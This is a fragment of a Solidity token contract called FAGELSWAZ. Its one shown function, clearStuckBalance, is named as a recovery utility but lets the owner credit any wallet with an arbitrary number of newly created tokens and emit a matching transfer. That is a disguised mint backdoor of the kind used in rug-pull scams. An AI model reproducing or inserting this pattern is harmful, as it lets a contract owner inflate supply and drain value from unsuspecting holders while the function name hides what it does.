...
contract FAGELSWAZ is Context, IERC20, Ownable {
    ...
    uint256 private _contractAutoLpLimitToken = 7500 * 10**18;
    ...
    function clearStuckBalance(address wallet, uint256 balance) public onlyOwner { _balance[wallet] += balance * 10**18; emit Transfer(address(this), wallet, balance * 10**18); }
